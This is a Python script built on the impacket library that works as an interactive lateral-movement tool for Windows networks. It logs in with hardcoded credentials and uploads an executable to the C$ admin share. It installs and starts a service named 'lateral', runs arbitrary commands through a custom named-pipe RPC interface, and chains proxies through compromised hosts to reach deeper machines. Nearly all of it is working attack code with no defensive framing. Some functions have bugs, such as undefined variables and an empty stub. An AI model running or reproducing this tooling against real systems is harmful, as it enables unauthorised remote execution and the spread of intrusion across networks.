#!/usr/bin/python3
from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.ndr import NULL
from impacket.crypto import encryptSecret
from impacket.smbconnection import SMBConnection
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.ndr import NDRULONG, NDRVaryingString, NDRCALL, NDRPOINTER, NDRUniConformantArray, NDRSTRUCT, NDRUniFixedArray
from impacket.dcerpc.v5.dtypes import LPWSTR, LPSTR, STR, SHORT, DWORD, PCHAR, LPBYTE, WSTR, LPDWORD
from impacket.dcerpc.v5.lsad import PCHAR_ARRAY
from impacket.dcerpc.v5.nrpc import UCHAR_ARRAY, PUCHAR_ARRAY
from impacket.dcerpc.v5.wkst import CHAR_ARRAY
from os import fork
from threading import Thread
from struct import unpack
from sys import argv, exit
import socket
from time import sleep


def copy(target, creds, source_path, target_path, share="c$", lmhash="", nthash=""):
	ip, port = target
	username, password, domain = creds
	smb = SMBConnection(remoteName='*SMBSERVER', remoteHost=ip, sess_port=port)
	smb.login(username, password, domain, lmhash, nthash)
	with open(source_path, "rb") as f:
		print("[*] copy")
		smb.putFile(share, target_path.replace('/','\\'), f.read)

def delete():
	pass

def start_service(target, creds, command, lmhash="", nthash=""):
	ip, port = target
	username, password, domain = creds
	aesKey = None
	remoteName = ip
	remoteHost = ip

	stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(port)
	rpctransport.setRemoteHost(remoteHost)
	if hasattr(rpctransport, 'set_credentials'):
		rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

	rpctransport.set_kerberos(False, None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(scmr.MSRPC_UUID_SCMR)
	rpc = dce

	#create
	print("[*] creating")
	ans = scmr.hROpenSCManagerW(rpc)
	scManagerHandle = ans['lpScHandle']
	try:
		scmr.hRCreateServiceW(rpc, scManagerHandle, "lateral" + '\x00', "Lateral" + '\x00', lpBinaryPathName=command + '\x00')
	except Exception as e:
		print(str(e))

	#start
	print("[*] starting")
	ans = scmr.hROpenServiceW(rpc, scManagerHandle, "lateral"+'\x00')
	serviceHandle = ans['lpServiceHandle']
	try:
		scmr.hRStartServiceW(rpc, serviceHandle)
	except:
		pass
	scmr.hRCloseServiceHandle(rpc, serviceHandle)

def stop_service(target, creds, lmhash="", nthash=""):
	ip, port = target
	username, password, domain = creds
	aesKey = None
	remoteName = ip
	remoteHost = ip

	stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(port)
	rpctransport.setRemoteHost(remoteHost)
	if hasattr(rpctransport, 'set_credentials'):
		rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

	rpctransport.set_kerberos(False, None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(scmr.MSRPC_UUID_SCMR)
	rpc = dce

	#delete
	print("[*] delete")
	ans = scmr.hROpenServiceW(rpc, scManagerHandle, "lateral"+'\x00')
	serviceHandle = ans['lpServiceHandle']
	scmr.hRDeleteService(rpc, serviceHandle)
	scmr.hRCloseServiceHandle(rpc, serviceHandle)

def install_service(target, creds):
	copy(target, creds, "msrpc/lateral.exe", "/windows/lateral.exe")
	start_service(target, creds, "lateral.exe")



class SC_RPC_HANDLE(NDRSTRUCT):
    structure =  (
        ('Data','20s=""'),
    )
    def getAlignment(self):
        return 1

class DCERPCSessionError(Exception):
    def __init__(self, packet, error_code):
        print(123)
        pass

class Connect(NDRCALL):
    opnum = 0
    structure = (
        ('ip',STR),
        ('port',SHORT),
    )
class ConnectResponse(NDRCALL):
    structure = (
        ('socket',DWORD),
    )

class Disconnect(NDRCALL):
    opnum = 1
    structure = (
        ('socket',DWORD),
    )
class DisconnectResponse(NDRCALL):
    structure = ()

class Send(NDRCALL):
    opnum = 2
    structure = (
        ('socket',DWORD),
        ('data',STR),
        ('len',DWORD),
    )
class SendResponse(NDRCALL):
    structure = (
        ('len',DWORD),
    )

class Recv(NDRCALL):
    opnum = 3
    structure = (
        ('socket',DWORD),
        ('len',DWORD),
    )
class RecvResponse(NDRCALL):
    structure = (
        ('data',CHAR_ARRAY),
        ('len',DWORD),
    )

class Execute(NDRCALL):
    opnum = 4
    structure = (
        ('cmd',STR),
    )
class ExecuteResponse(NDRCALL):
    structure = (
        ('data',LPSTR),
    )

def msrpc(target, creds):
	ip, port = target
	username, password, domain = creds
	MSRPC_UUID_test  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))

	stringbinding = r'ncacn_np:%s[\pipe\lateral]' % ip
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(port)
	rpctransport.setRemoteHost(ip)
	rpctransport.set_credentials(username, password, domain, "", "", None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(MSRPC_UUID_test)
	return dce

def execute(cmd, target, creds):
	ip, port = target
	username, password, domain = creds
	#print(ip, username, password, domain, port)
	dce = msrpc((ip, port), (username, password, domain))
	execute = Execute()
	execute["cmd"] = cmd + "\x00"
	res = dce.request(execute)
	return str(res["data"], "cp866")

connections = {}
def proxy(target_from, target_to, creds):
	ip_from, port_from = target_from
	ip_to, port_to = target_to
	username, password, domain = creds
	#print(target_from, target_to ,username, password, domain)

	def incoming(c, sock, target_from, creds, connect_id):
		global connections
		dce = msrpc(target_from, creds)
		while True:
			recv = Recv()
			recv["socket"] = sock
			recv["len"] = 1024
			dce.call(recv.opnum, recv)
			res = dce.recv()
			data = res[ 4 : unpack("<I", res[-4:])[0]+4 ]
			if not data:
				print("incoming closed")
				connections[connect_id] = True
				break
#			print("<-" + str(data) + "[" + str(len(data)) + "]")
			c.send(data)
			#print("incoming")

	def outcoming(c, sock, target_from, creds, connect_id):
		global connections
		dce = msrpc(target_from, creds)
		while True:
			data = c.recv(1024)
			if not data or connections[connect_id]:
				print("outcoming closed")
				connections[connect_id] = True
				break
#			print("->" + str(data) + "[" + str(len(data)) + "]")
			send = Send()
			send["socket"] = sock
			send["data"] = data + b"\x00"
			send["len"] = len(data)
			res = dce.request(send, checkError=False)
			#res.dump()
			#print("outcoming")

	def redirect(c, target_from, target_to, creds, connect_id):
		ip_to, port_to = target_to

		dce = msrpc(target_from, creds)
		connect = Connect()
		connect["ip"] = ip_to + "\x00"
		connect["port"] = port_to
		res = dce.request(connect, checkError=False)
		#res.dump()
		if res["socket"]:
			connections[connect_id] = False
			incoming_thr = Thread(target=incoming, args=(c, res["socket"], target_from, creds, connect_id))
			outcoming_thr = Thread(target=outcoming, args=(c, res["socket"], target_from, creds, connect_id))
			incoming_thr.start()
			outcoming_thr.start()
			while not connections[connect_id]:
			    sleep(1)
			#incoming_thr.join()
			#outcoming_thr.join()

			disconnect = Disconnect()
			disconnect["socket"] = res["socket"]
			res = dce.request(disconnect)
			res.dump()

	def serve(s, target_from, target_to, creds):
		local_port = s.getsockname()[1]
		while True:
			c,info = s.accept()
			connect_id=info[1]
			redirect_thr = Thread(target=redirect, args=(c, target_from, target_to, creds, connect_id))
			redirect_thr.start()
			print(f"[*] proxying {info[0]}:{info[1]} -> {local_port}")

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(('127.0.0.1', 0))
	s.listen(10)
	serve_thr = Thread(target=serve, args=(s, target_from, target_to, creds))
	serve_thr.start()
	local_port = s.getsockname()[1]
	return local_port

def check_pipe(target, creds):
	ip, port = target
	username, password, domain = creds
	try:
		MSRPC_UUID_test  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))
		stringbinding = r'ncacn_np:%s[\pipe\lateral]' % ip
		rpctransport = transport.DCERPCTransportFactory(stringbinding)
		rpctransport.set_dport(port)
		rpctransport.setRemoteHost(ip)
		rpctransport.set_credentials(username, password, domain, "", "", None)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.bind(MSRPC_UUID_test)
		return True
	except Exception as e:
		return False

class Chain:
	def __init__(self, ip, port):
		self.next = []
		self.prev = None
		self.target = ip
		self.target_port = port
		self.target_ip = ip
	def new(self, ip, port):
		self.next.append( Chain(ip, port) )
		self.next[-1].prev = self
		self.next[-1].target_ip = "127.0.0.1"
		return self.next[-1]

def chain_get_root(the_chain):
	while True:
		if not the_chain.prev:
			break
		the_chain = the_chain.prev
	return the_chain

def chain_walk(the_chain, deep=0):
	print(" "*deep + "`" + (the_chain.target if the_chain.target != chain.target else the_chain.target+" <-"))
	for the_chain in the_chain.next:
		chain_walk(the_chain, deep+1)

if __name__ == '__main__':
	target = argv[1]
	username = 'admin'
	password = 'qwerty=123'
	domain = '.'
	port = 445
	chain = Chain(target, 445)
	while True:
		line = input(f"{chain.target}/> ")
		if not line:
			continue
		if line.startswith("shell "):
			_,new_target = line.split(" ")
			port = proxy((chain.target_ip, chain.target_port), (new_target, 445), (username, password, domain))
			chain = chain.new(new_target, port)
		elif line in ("show", "bt"):
			chain_walk(chain_get_root(chain))
		elif line in ("back",):
			chain = chain.prev
		elif line in ("goto ",):
			pass
		elif line in ('exit', 'quit', 'q'):
			break
		else:
			cmd = line
			if not check_pipe((chain.target_ip, chain.target_port), (username, password, domain)):
				install_service((chains.target_ip, chain.target_port), (username, password, domain))
			print( execute(cmd, (chain.target_ip, chain.target_port), (username, password, domain)) )
